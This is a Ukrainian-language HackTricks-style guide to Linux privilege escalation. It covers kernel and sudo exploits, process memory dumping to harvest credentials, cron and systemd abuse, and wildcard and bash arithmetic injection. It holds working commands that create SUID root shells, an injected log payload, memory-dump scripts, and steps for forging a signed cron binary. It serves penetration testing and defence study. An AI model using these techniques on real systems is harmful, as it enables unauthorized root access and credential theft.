# Підвищення привілеїв у Linux

{{#include ../../../banners/hacktricks-training.md}}

## Інформація про систему

### Інформація про ОС

Почнімо зі збору інформації про запущену ОС
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Шлях

Якщо ви **маєте дозволи на запис до будь-якої папки у змінній `PATH`**, ви можете перехопити деякі бібліотеки або бінарні файли:
```bash
echo $PATH
```
### Інформація про середовище

Цікава інформація, паролі або API-ключі у змінних середовища?
```bash
(env || set) 2>/dev/null
```
### Експлойти ядра

Перевірте версію ядра та наявність експлойту, який можна використати для підвищення привілеїв
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Ви можете знайти хороший список вразливих kernel і деякі вже **скомпільовані exploits** тут: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) і [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Інші сайти, де можна знайти **скомпільовані exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Щоб витягнути всі вразливі версії kernel із цього сайту, можна виконати:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Інструменти, які можуть допомогти знайти kernel exploits:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (виконувати IN victim, перевіряє лише exploits для kernel 2.x)

Завжди **шукайте версію kernel у Google**, можливо, ваша версія kernel зазначена в якомусь kernel exploit, і тоді ви будете впевнені, що цей exploit дійсний.

Додаткові техніки kernel exploitation:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Підвищення привілеїв у Linux - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Версія Sudo

На основі вразливих версій sudo, наведених у:
```bash
searchsploit sudo
```
Ви можете перевірити, чи є версія sudo вразливою, за допомогою цього grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Версії Sudo до 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) дозволяють локальним користувачам без привілеїв підвищити свої привілеї до root через опцію sudo `--chroot`, якщо файл `/etc/nsswitch.conf` використовується з каталогу, контрольованого користувачем.

Ось [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) для експлуатації цієї [вразливості](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Перед запуском exploit переконайтеся, що ваша версія `sudo` є вразливою та підтримує функцію `chroot`.

Докладнішу інформацію дивіться в оригінальному [повідомленні про вразливість](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

### Обхід правил Sudo на основі хоста (CVE-2025-32462)

Sudo до версії 1.9.17p1 (заявлений уразливий діапазон: **1.8.8–1.9.17**) може обробляти правила sudoers на основі хоста, використовуючи **ім'я хоста, передане користувачем**, з `sudo -h <host>` замість **реального імені хоста**. Якщо sudoers надає ширші привілеї на іншому хості, ви можете локально **підмінити** цей хост.

Вимоги:
- Уразлива версія sudo
- Специфічні для хоста правила sudoers (хост не є ні поточним іменем хоста, ні `ALL`)

Приклад шаблону sudoers:
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
Експлуатація шляхом підміни дозволеного хоста:
```bash
sudo -h devbox id
sudo -h devbox -i
```
Якщо розв’язання підробленого імені блокується, додайте його до `/etc/hosts` або використайте hostname, який уже зустрічається в логах/конфігураціях, щоб уникнути DNS-запитів.

#### sudo < v1.8.28

Від @sickrov
```
sudo -u#-1 /bin/bash
```
### Не вдалося перевірити підпис Dmesg

Перевірте **smasher2 box of HTB**, щоб переглянути **приклад** того, як цю vuln можна було exploit
```bash
dmesg 2>/dev/null | grep "signature"
```
### Додаткове перерахування системи
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Перелічити можливі засоби захисту

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Вихід із контейнера

Якщо ви перебуваєте всередині контейнера, почніть із наведеного нижче розділу про безпеку контейнерів, а потім перейдіть до сторінок зі зловживаннями, специфічними для середовища виконання:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Диски

Перевірте, **що змонтовано та демонтовано**, де і чому. Якщо щось демонтовано, можна спробувати змонтувати це та перевірити наявність приватної інформації.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Корисне програмне забезпечення

Перелічіть корисні бінарні файли
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Також перевірте, чи встановлено **будь-який компілятор**. Це корисно, якщо вам потрібно використати якийсь kernel exploit, оскільки рекомендується компілювати його на машині, де ви збираєтеся його використовувати (або на подібній).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Встановлене вразливе програмне забезпечення

Перевірте **версію встановлених пакетів і служб**. Можливо, встановлено стару версію Nagios (наприклад), яку можна використати для підвищення привілеїв…\
Рекомендується вручну перевірити версію найбільш підозрілого встановленого програмного забезпечення.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Якщо у вас є SSH-доступ до машини, ви також можете використати **openVAS**, щоб перевірити наявність застарілого та вразливого програмного забезпечення, встановленого на машині.

> [!NOTE] > _Зверніть увагу, що ці команди покажуть багато інформації, яка здебільшого буде непотрібною, тому рекомендується використовувати такі застосунки, як OpenVAS або подібні, які перевірять, чи є версія будь-якого встановленого програмного забезпечення вразливою до відомих експлойтів_

## Процеси

Перегляньте, **які процеси** виконуються, і перевірте, чи має якийсь процес **більше привілеїв, ніж повинен** (можливо, tomcat запускається від імені root?).
```bash
ps aux
ps -ef
top -n 1
```
Завжди перевіряйте наявність запущених [**electron/cef/chromium debuggers**](../../software-information/electron-cef-chromium-debugger-abuse.md), оскільки їх можна використати для підвищення привілеїв. **Linpeas** виявляє їх, перевіряючи параметр `--inspect` у командному рядку процесу.\
Також **перевірте свої привілеї щодо бінарних файлів процесів** — можливо, ви зможете перезаписати чиїсь.

### Ланцюжки parent-child між користувачами

Дочірній процес, запущений під **іншим користувачем**, ніж його батьківський процес, не є автоматично шкідливим, але це корисний **сигнал для triage**. Деякі переходи є очікуваними (`root` запускає service user, менеджери входу створюють процеси сесій), але незвичні ланцюжки можуть виявити wrapper-и, debug helpers, persistence або слабкі межі довіри runtime.

Швидкий огляд:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
Якщо ви виявили нетиповий ланцюжок, перевірте командний рядок батьківського процесу та всі файли, що впливають на його поведінку (`config`, `EnvironmentFile`, допоміжні скрипти, робочий каталог, аргументи, доступні для запису). У кількох реальних privesc-сценаріях сам дочірній процес не був доступний для запису, але таким був **config, контрольований батьківським процесом**, або ланцюжок допоміжних скриптів.

### Видалені виконувані файли та видалені відкриті файли

Артефакти виконання часто залишаються доступними **після видалення**. Це корисно як для privilege escalation, так і для відновлення доказів із процесу, який уже має відкриті чутливі файли.

Перевірте наявність видалених виконуваних файлів:
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
Якщо `/proc/<PID>/exe` вказує на `(deleted)`, процес усе ще використовує старий образ бінарного файлу з пам’яті. Це вагомий сигнал для перевірки, оскільки:

- видалений виконуваний файл може містити цікаві рядки або облікові дані
- запущений процес усе ще може надавати корисні файлові дескриптори
- видалений привілейований бінарний файл може вказувати на нещодавнє втручання або спробу приховати сліди

Зберіть список deleted-open files глобально:
```bash
lsof +L1
```
Якщо ви знайдете цікавий дескриптор, отримайте його безпосередньо:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
Це особливо цінно, коли процес усе ще має відкритий видалений secret, script, database export або flag file.

### Моніторинг процесів

Ви можете використовувати такі інструменти, як [**pspy**](https://github.com/DominicBreuker/pspy), для моніторингу процесів. Це може бути дуже корисно для виявлення вразливих процесів, які часто виконуються або запускаються після виконання певного набору вимог.

### Пам'ять процесів

Деякі сервіси сервера зберігають **credentials у відкритому вигляді всередині пам'яті**.\
Зазвичай вам будуть потрібні **root privileges**, щоб читати пам'ять процесів, які належать іншим користувачам, тому це зазвичай корисніше, коли ви вже маєте root і хочете знайти додаткові credentials.\
Однак пам'ятайте, що **як звичайний користувач ви можете читати пам'ять процесів, якими володієте**.

> [!WARNING]
> Зверніть увагу, що сьогодні більшість машин **типово не дозволяють ptrace**, а це означає, що ви не можете зробити dump інших процесів, які належать вашому unprivileged user.
>
> Файл _**/proc/sys/kernel/yama/ptrace_scope**_ контролює доступність ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: усі процеси можна debug, якщо вони мають однаковий uid. Це класичний спосіб роботи ptrace.
> - **kernel.yama.ptrace_scope = 1**: debug можна виконувати лише для батьківського процесу.
> - **kernel.yama.ptrace_scope = 2**: лише admin може використовувати ptrace, оскільки для цього потрібна capability CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: жодні процеси не можна trace за допомогою ptrace. Після встановлення цього значення потрібне перезавантаження, щоб знову увімкнути ptrace.

#### GDB

Якщо ви маєте доступ до пам'яті FTP service (наприклад), ви можете отримати Heap і виконати пошук credentials усередині нього.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Скрипт GDB
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Для заданого ідентифікатора процесу **maps показує, як пам'ять відображається у віртуальному адресному просторі цього процесу**; також він показує **права доступу до кожного відображеного регіону**. Псевдофайл **mem надає доступ до самої пам'яті процесу**. Із файла **maps** ми дізнаємося, які **ділянки пам'яті доступні для читання**, а також їхні зміщення. Використовуючи цю інформацію, ми переходимо до потрібних позицій у файлі **mem** і зберігаємо всі доступні для читання ділянки у файл.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` надає доступ до **фізичної** пам'яті системи, а не до віртуальної пам'яті. Віртуальний адресний простір ядра можна отримати за допомогою /dev/kmem.\
Зазвичай читати `/dev/mem` можуть лише **root** і група **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump для Linux

ProcDump — це Linux-реалізація класичного інструмента ProcDump із набору інструментів Sysinternals для Windows. Завантажте його на [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Інструменти

Щоб зняти дамп пам’яті процесу, можна використати:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Ви можете вручну видалити вимоги root і зняти дамп процесу, яким ви володієте
- Скрипт A.5 з [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (потрібен root)

### Облікові дані з пам’яті процесу

#### Приклад вручну

Якщо ви виявите, що процес authenticator запущений:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Ви можете створити дамп процесу (див. попередні розділи, щоб знайти різні способи створення дампу пам’яті процесу) і виконати пошук облікових даних у пам’яті:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Інструмент [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **викрадає облікові дані у відкритому тексті з пам’яті** та з деяких **відомих файлів**. Для належної роботи йому потрібні привілеї root.

| Функція                                           | Назва процесу         |
| ------------------------------------------------- | -------------------- |
| Пароль GDM (Kali Desktop, Debian Desktop)         | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (активні FTP-з’єднання)                   | vsftpd               |
| Apache2 (активні сеанси HTTP Basic Auth)         | apache2              |
| OpenSSH (активні SSH-сеанси — використання Sudo) | sshd:                |

#### Пошукові Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Заплановані/Cron jobs

### Crontab UI (alseambusher), що працює від root — privesc через вебпланувальник

Якщо вебпанель “Crontab UI” (alseambusher/crontab-ui) працює від root і прив’язана лише до loopback, до неї все одно можна отримати доступ через локальне перенаправлення портів SSH і створити привілейоване завдання для підвищення привілеїв.

Типовий ланцюжок
- Виявити порт, доступний лише через loopback (наприклад, 127.0.0.1:8000), і realm Basic-Auth за допомогою `ss -ntlp` / `curl -v localhost:8000`
- Знайти облікові дані в операційних артефактах:
- Бекапи/скрипти з `zip -P <password>`
- systemd unit, що розкриває `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Створити тунель і увійти:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Створіть завдання з високими привілеями та негайно запустіть його (створює SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Використайте це:
```bash
/tmp/rootshell -p   # root shell
```
Зміцнення безпеки
- Не запускайте Crontab UI від імені root; обмежте його окремим користувачем і мінімальними дозволами
- Прив’яжіть до localhost і додатково обмежте доступ через firewall/VPN; не використовуйте паролі повторно
- Уникайте вбудовування секретів у unit files; використовуйте secret stores або EnvironmentFile, доступний лише root
- Увімкніть аудит/логування виконання job на вимогу



Перевірте, чи є якесь заплановане job вразливим. Можливо, ви зможете скористатися тим, що script виконується від імені root (wildcard vuln? можна змінити файли, які використовує root? використати symlinks? створити певні файли в директорії, яку використовує root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
Якщо використовується `run-parts`, перевірте, які назви насправді буде виконано:
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
Це дозволяє уникнути хибних спрацювань. Каталог із правом запису, що періодично обробляється, корисний лише тоді, коли ім’я вашого payload відповідає локальним правилам `run-parts`.

### Шлях Cron

Наприклад, у _/etc/crontab_ можна знайти PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Зверніть увагу, що користувач "user" має права на запис у /home/user_)

Якщо всередині цього crontab користувач root намагається виконати певну команду або скрипт без зазначення шляху. Наприклад: _\* \* \* \* root overwrite.sh_\
Тоді ви можете отримати root shell за допомогою:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron із використанням скрипту з wildcard (Wildcard Injection)

Якщо скрипт, який виконується від імені root, містить “**\***” усередині команди, це можна експлуатувати для виконання неочікуваних дій (наприклад, privesc). Приклад:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Якщо перед wildcard стоїть шлях, наприклад** _**/some/path/\***_ **, це не вразливо (навіть** _**./\***_ **не є вразливим).**

Прочитайте наступну сторінку, щоб дізнатися про інші tricks експлуатації wildcard:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Ін’єкція Bash arithmetic expansion у cron log parsers

Bash виконує parameter expansion і command substitution перед arithmetic evaluation у ((...)), $((...)) і let. Якщо root cron/parser читає недовірені поля log і передає їх в arithmetic context, attacker може ін’єктувати command substitution $(...), яка виконається з правами root під час запуску cron.

- Чому це працює: у Bash expansions виконуються в такому порядку: parameter/variable expansion, command substitution, arithmetic expansion, а потім word splitting і pathname expansion. Тому значення на кшталт `$(/bin/bash -c 'id > /tmp/pwn')0` спочатку підставляється (запускаючи command), після чого залишковий numeric `0` використовується для arithmetic, і script продовжує виконання без помилок.

- Типовий vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Експлуатація: доможіться запису attacker-controlled text у parsed log так, щоб numeric-looking field містило command substitution і завершувалося digit. Переконайтеся, що ваша command не виводить дані в stdout (або перенаправте їх), щоб arithmetic залишався valid.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Перезапис cron script і symlink

Якщо **ви можете змінити cron script**, який виконується з правами root, отримати shell дуже легко:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Якщо скрипт, який виконується від імені **root**, використовує **каталог, до якого ви маєте повний доступ**, можливо, буде корисно видалити цю папку та **створити папку-символічне посилання на іншу**, яка містить скрипт під вашим контролем.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Перевірка символічних посилань і безпечніша робота з файлами

Під час перевірки привілейованих скриптів/бінарних файлів, які читають або записують файли за шляхом, перевірте, як обробляються посилання:

- `stat()` переходить за символічним посиланням і повертає метадані цільового об’єкта.
- `lstat()` повертає метадані самого посилання.
- `readlink -f` і `namei -l` допомагають визначити кінцеву ціль і показати дозволи для кожного компонента шляху.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Для defenders/developers безпечніші підходи проти symlink tricks включають:

- `O_EXCL` разом із `O_CREAT`: помилка, якщо шлях уже існує (блокує заздалегідь створені attacker-ом links/files).
- `openat()`: працювати відносно file descriptor довіреного каталогу.
- `mkstemp()`: атомарно створювати тимчасові files із безпечними permissions.

### Custom-signed cron binaries із writable payloads
Blue teams іноді "підписують" cron-driven binaries, вивантажуючи custom ELF section і виконуючи їх як root лише після пошуку vendor string через grep. Якщо цей binary доступний для запису групі (наприклад, `/opt/AV/periodic-checks/monitor`, власник `root:devs 770`) і ви можете отримати leak signing material, можна підробити section і перехопити cron task:

1. Використайте `pspy`, щоб перехопити verification flow. В Era root запускав `objcopy --dump-section .text_sig=text_sig_section.bin monitor`, потім `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin`, а після цього виконував file.
2. Відтворіть очікуваний certificate за допомогою leaked key/config (із `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Створіть malicious replacement (наприклад, встановіть SUID bash або додайте свій SSH key) і вбудуйте certificate у `.text_sig`, щоб grep пройшов:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Перезапишіть scheduled binary, зберігши execute bits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Дочекайтеся наступного cron run; щойно наївна signature check буде успішною, ваш payload запуститься як root.

### Часті cron jobs

Ви можете monitor-ити processes, щоб знаходити processes, які запускаються кожні 1, 2 або 5 хвилин. Можливо, ви зможете скористатися цим і підвищити privileges.

Наприклад, щоб **monitor-ити кожні 0.1 с протягом 1 хвилини**, **відсортувати за найменшою кількістю запусків commands** і видалити commands, які запускалися найчастіше, можна виконати:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Також можна використовувати** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (це відстежуватиме та перелічуватиме кожен запущений процес).

### Root backups, які зберігають встановлені атакувальником біти режиму (pg_basebackup)

Якщо cron із правами root запускає `pg_basebackup` (або будь-яке рекурсивне копіювання) для каталогу бази даних, до якого ви маєте доступ на запис, можна розмістити **SUID/SGID binary**, який буде повторно скопійовано як **root:root** із тими самими бітами режиму до вихідного каталогу backup.

Типовий процес пошуку (від імені користувача БД із низькими привілеями):
- Використайте `pspy`, щоб виявити root cron, який щось на кшталт `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` запускає щохвилини.
- Переконайтеся, що вихідний кластер (наприклад, `/var/lib/postgresql/14/main`) доступний вам для запису, а каталог призначення (`/opt/backups/current`) після виконання job належить root.

Експлуатація:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
Це працює, оскільки `pg_basebackup` зберігає біти режиму доступу під час копіювання кластера; коли його запускає root, файли призначення успадковують **власника root + вибрані зловмисником SUID/SGID**. Будь-яка подібна привілейована процедура backup/copy, яка зберігає дозволи та записує дані у виконуване розташування, є вразливою.

### Невидимі cron jobs

Можна створити cronjob, **додавши carriage return після коментаря** (без символу нового рядка), і cron job працюватиме. Приклад (зверніть увагу на символ carriage return):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
Щоб виявити такий тип прихованого входу, перевірте cron-файли за допомогою інструментів, які відображають керівні символи:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Сервіси

### Доступні для запису _.service_ файли

Перевірте, чи можете ви записувати в будь-який файл `.service`. Якщо так, ви **можете змінити його**, щоб він **виконував** ваш **backdoor, коли** сервіс **запускається**, **перезапускається** або **зупиняється** (можливо, вам доведеться дочекатися перезавантаження машини).\
Наприклад, створіть свій backdoor у файлі .service за допомогою **`ExecStart=/tmp/script.sh`**

### Бінарні файли сервісів, доступні для запису

Пам’ятайте, що якщо у вас є **права на запис бінарних файлів, які виконуються сервісами**, ви можете змінити їх, додавши backdoor, щоб після повторного виконання сервісів backdoor було виконано.

### systemd PATH - Відносні шляхи

Ви можете переглянути PATH, який використовується **systemd**, за допомогою:
```bash
systemctl show-environment
```
Якщо ви виявите, що можете **записувати** до будь-якої папки в цьому шляху, можливо, вам вдасться **підвищити привілеї**. Потрібно шукати **відносні шляхи**, що використовуються у файлах конфігурації сервісів, наприклад:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Потім створіть **виконуваний файл** з **такою самою назвою, як у бінарного файлу з відносним шляхом**, у папці PATH systemd, до якої ви маєте доступ на запис. Коли службу попросять виконати вразливу дію (**Start**, **Stop**, **Reload**), буде виконано ваш **backdoor** (непривілейовані користувачі зазвичай не можуть запускати/зупиняти служби, але перевірте, чи можете ви використати `sudo -l`).

**Дізнайтеся більше про служби за допомогою `man systemd.service`.**

## **Таймери**

**Таймери** — це файли модулів systemd, назви яких закінчуються на `**.timer**` і які керують файлами `**.service**` або подіями. **Таймери** можна використовувати як альтернативу cron, оскільки вони мають вбудовану підтримку подій календарного та монотонного часу й можуть виконуватися асинхронно.

Перелічити всі таймери можна за допомогою:
```bash
systemctl list-timers --all
```
### Таймери, доступні для запису

Якщо ви можете змінити timer, ви можете змусити його виконати деякі сутності systemd.unit (наприклад, `.service` або `.target`)
```bash
Unit=backdoor.service
```
У документації ви можете прочитати, що таке Unit:

> Unit, який потрібно активувати після спрацювання цього таймера. Аргументом є ім’я Unit без суфікса ".timer". Якщо його не вказано, за замовчуванням використовується service з таким самим ім’ям, як у timer Unit, але без суфікса. (Див. вище.) Рекомендується, щоб імена активованого Unit і timer Unit були ідентичними, за винятком суфікса.

Отже, щоб зловживати цим permission, потрібно:

- Знайти системний systemd Unit (наприклад, `.service`), який **виконує binary із правом запису**
- Знайти системний Unit, який **виконує relative path**, і мати **права на запис** до **systemd PATH** (щоб видати себе за цей executable)

**Дізнайтеся більше про timers за допомогою `man systemd.timer`.**

### **Увімкнення Timer**

Щоб увімкнути timer, потрібні root privileges і виконання:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Зверніть увагу, що **timer** **активується** шляхом створення symlink на нього за адресою `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Сокети

Unix Domain Sockets (UDS) забезпечують **комунікацію між процесами** на одній або різних машинах у межах клієнт-серверних моделей. Вони використовують стандартні Unix descriptor files для комунікації між комп’ютерами та налаштовуються через `.socket` files.

Сокети можна налаштовувати за допомогою `.socket` files.

**Дізнайтеся більше про сокети за допомогою `man systemd.socket`.** У цьому файлі можна налаштувати кілька цікавих параметрів:

